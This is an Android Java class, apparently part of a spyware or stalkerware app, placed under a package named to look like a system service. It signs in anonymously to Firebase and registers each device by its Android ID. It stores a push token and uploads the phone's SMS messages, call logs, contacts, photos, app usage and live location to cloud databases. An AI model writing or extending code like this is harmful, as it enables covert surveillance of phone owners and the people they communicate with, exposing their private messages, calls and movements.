package com.system.service.manager;

import android.content.Context;
import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;
import java.util.Map;

/**
 * Data Manager - Handles Firebase data operations
 * Manages authentication and data synchronization
 */
public class DataManager {
    
    private static final String TAG = "DataManager";
    
    private Context context;
    private FirebaseAuth firebaseAuth;
    private DatabaseReference realtimeDatabase;
    private FirebaseFirestore firestore;
    private String deviceId;
    
    public DataManager(Context context) {
        this.context = context;
        this.firebaseAuth = FirebaseAuth.getInstance();
        this.realtimeDatabase = FirebaseDatabase.getInstance().getReference();
        this.firestore = FirebaseFirestore.getInstance();
        this.deviceId = android.provider.Settings.Secure.getString(
            context.getContentResolver(), 
            android.provider.Settings.Secure.ANDROID_ID
        );
        
        // Initialize anonymous authentication
        initializeAuth();
    }
    
    /**
     * Initialize Firebase authentication
     */
    private void initializeAuth() {
        if (firebaseAuth.getCurrentUser() == null) {
            // Sign in anonymously for device tracking
            firebaseAuth.signInAnonymously()
                .addOnCompleteListener(task -> {
                    if (task.isSuccessful()) {
                        Log.d(TAG, "Anonymous authentication successful");
                        initializeDevice();
                    } else {
                        Log.e(TAG, "Anonymous authentication failed", task.getException());
                    }
                });
        } else {
            initializeDevice();
        }
    }
    
    /**
     * Initialize device in Firebase
     */
    private void initializeDevice() {
        FirebaseUser user = firebaseAuth.getCurrentUser();
        if (user != null) {
            Map<String, Object> deviceInfo = new HashMap<>();
            deviceInfo.put("deviceId", deviceId);
            deviceInfo.put("userId", user.getUid());
            deviceInfo.put("status", "online");
            deviceInfo.put("lastSeen", System.currentTimeMillis());
            deviceInfo.put("appVersion", "1.0.0");
            
            // Update device info in Realtime Database
            realtimeDatabase.child("devices").child(deviceId).setValue(deviceInfo);
            
            // Also store in Firestore for querying
            firestore.collection("devices").document(deviceId).set(deviceInfo);
        }
    }
    
    /**
     * Update device FCM token
     */
    public void updateDeviceToken(String token) {
        Map<String, Object> tokenUpdate = new HashMap<>();
        tokenUpdate.put("fcmToken", token);
        tokenUpdate.put("lastTokenUpdate", System.currentTimeMillis());
        
        realtimeDatabase.child("devices").child(deviceId).updateChildren(tokenUpdate);
        firestore.collection("devices").document(deviceId).update(tokenUpdate);
    }
    
    /**
     * Store SMS data
     */
    public void storeSmsData(Map<String, Object> smsData) {
        smsData.put("deviceId", deviceId);
        smsData.put("timestamp", System.currentTimeMillis());
        
        // Store in Realtime Database for real-time updates
        realtimeDatabase.child("sms").child(deviceId).push().setValue(smsData);
        
        // Store in Firestore for querying and analytics
        firestore.collection("sms").add(smsData);
    }
    
    /**
     * Store call log data
     */
    public void storeCallData(Map<String, Object> callData) {
        callData.put("deviceId", deviceId);
        callData.put("timestamp", System.currentTimeMillis());
        
        realtimeDatabase.child("calls").child(deviceId).push().setValue(callData);
        firestore.collection("calls").add(callData);
    }
    
    /**
     * Store location data
     */
    public void storeLocationData(Map<String, Object> locationData) {
        locationData.put("deviceId", deviceId);
        locationData.put("timestamp", System.currentTimeMillis());
        
        // Store current location in Realtime Database for live tracking
        realtimeDatabase.child("locations").child("current").child(deviceId).setValue(locationData);
        
        // Store location history in Firestore
        firestore.collection("locations").add(locationData);
    }
    
    /**
     * Store app usage data
     */
    public void storeAppUsageData(Map<String, Object> appUsageData) {
        appUsageData.put("deviceId", deviceId);
        appUsageData.put("timestamp", System.currentTimeMillis());
        
        realtimeDatabase.child("app_usage").child(deviceId).push().setValue(appUsageData);
        firestore.collection("app_usage").add(appUsageData);
    }
    
    /**
     * Store contact data
     */
    public void storeContactData(Map<String, Object> contactData) {
        contactData.put("deviceId", deviceId);
        contactData.put("timestamp", System.currentTimeMillis());
        
        realtimeDatabase.child("contacts").child(deviceId).push().setValue(contactData);
        firestore.collection("contacts").add(contactData);
    }
    
    /**
     * Store photo data
     */
    public void storePhotoData(Map<String, Object> photoData) {
        photoData.put("deviceId", deviceId);
        photoData.put("timestamp", System.currentTimeMillis());
        
        realtimeDatabase.child("photos").child(deviceId).push().setValue(photoData);
        firestore.collection("photos").add(photoData);
    }
    
    /**
     * Update device status
     */
    public void updateDeviceStatus(String status) {
        Map<String, Object> statusUpdate = new HashMap<>();
        statusUpdate.put("status", status);
        statusUpdate.put("lastSeen", System.currentTimeMillis());
        
        realtimeDatabase.child("devices").child(deviceId).updateChildren(statusUpdate);
        firestore.collection("devices").document(deviceId).update(statusUpdate);
    }
    
    /**
     * Get device ID
     */
    public String getDeviceId() {
        return deviceId;
    }
}